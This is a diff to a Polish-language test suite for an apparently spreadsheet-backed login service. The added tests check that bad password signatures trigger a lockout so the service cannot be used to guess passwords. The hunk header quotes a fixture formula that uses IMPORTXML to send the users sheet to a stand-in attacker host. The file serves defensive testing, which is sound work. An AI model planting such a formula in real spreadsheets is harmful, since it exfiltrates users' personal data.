@@ -183,4 +183,28 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   ok('zakładka Ustawienia nie jest nadpisywana przez zapytania klienta (żadna akcja nie zapisuje tam danych od klienta)', ust().w.length === 4);
   ok('istniejąca zakładka „Ustawienia” bez wiersza adresu (ze starszej wersji skryptu) jest uzupełniona o ten wiersz przy następnym wywołaniu inicjalizuj()', (() => { const C = swiezy(); C.get('Ustawienia').w.pop(); C.wywolaj('inicjalizuj()'); return C.get('Ustawienia').w.length === 4 && C.get('Ustawienia').w[3][0] === 'adres_odbiorcy'; })());
 }
+/* ---- 9. podpis hasłem nie jest wyrocznią do zgadywania hasła bez limitu ---- */
+{
+  const B = swiezy(); let trafien = 0;
+  B.get('Ustawienia').w[1][1] = 'Tajne-Haslo-2026'; B.get('Ustawienia').w[2][1] = '2099-12-31'; B.get('Ustawienia').w[3][1] = 'odbiorca@firma.pl';
+  const wpisyLog = () => B.get('Log').getLastRow();
+  for (let i = 0; i < 59; i++) if (B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'kandydat' + i }).pelne) trafien++;
+  ok('59 złych podpisów hasłem (np. stare hasło na drugim urządzeniu) — dobry podpis dalej przechodzi', trafien === 0 && B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true);
+  const logPrzed = wpisyLog();
+  for (let i = 0; i < 140; i++) B.post({ akcja: i % 2 ? 'puls' : 'haslo_paczki', kod: '12345' }, { haslo: 'kandydat-b' + i });
+  const p = B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' });
+  ok('po przekroczeniu limitu złych podpisów nawet trafione hasło nie daje „pelne” (wyrocznia zamknięta)', p.pelne === false && p.imie === '' && p.status === 'ok', JSON.stringify(p));
+  ok('…haslo_paczki też odmawia (hasło paczki nie wychodzi)', (() => { const r = B.post({ akcja: 'haslo_paczki', kod: '12345' }, { haslo: 'haslo123' }); return r.status === 'odmowa' && !('haslo' in r); })());
+  ok('…a sesja nie dopisuje wpisu', (() => { const n = B.get('Sesje').getLastRow(); B.post({ akcja: 'sesja', kod: '12345', rodzaj: 'logowanie' }, { haslo: 'haslo123' }); return B.get('Sesje').getLastRow() === n; })());
+  ok('zablokowanie podpisów hasłem zostawia JEDEN wpis w Log', B.get('Log').w.slice(1).filter(r => r[2] === 'podpis_hasla' && /ZABLOKOWANY/.test(r[3])).length === 1 && wpisyLog() > logPrzed);
+  ok('limit dotyczy tylko tego kodu (inne konto pulsuje w pełni)', B.post({ akcja: 'puls', kod: '33333' }, { haslo: 'haslo123' }).pelne === true);
+  ok('złe podpisy hasłem nie blokują logowania (osobny licznik)', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).status === 'ok');
+  ok('udane logowanie hasłem zdejmuje blokadę podpisów', B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true && B.post({ akcja: 'haslo_paczki', kod: '12345' }, { haslo: 'haslo123' }).status === 'ok');
+  const C = swiezy();
+  for (let i = 0; i < 80; i++) C.post({ akcja: 'puls', kod: '12345' });
+  ok('puls bez podpisu hasłem (stary program) nie zużywa limitu', C.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true);
+  for (let i = 0; i < 70; i++) C.post({ akcja: 'puls', kod: '12345' }, { haslo: 'zle' + i });
+  C.dalej(6 * 3600 * 1000 + 1000);
+  ok('po 6 godzinach (koniec okna) dobry podpis znów przechodzi bez logowania', C.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true);
+}
 process.exit(kod);
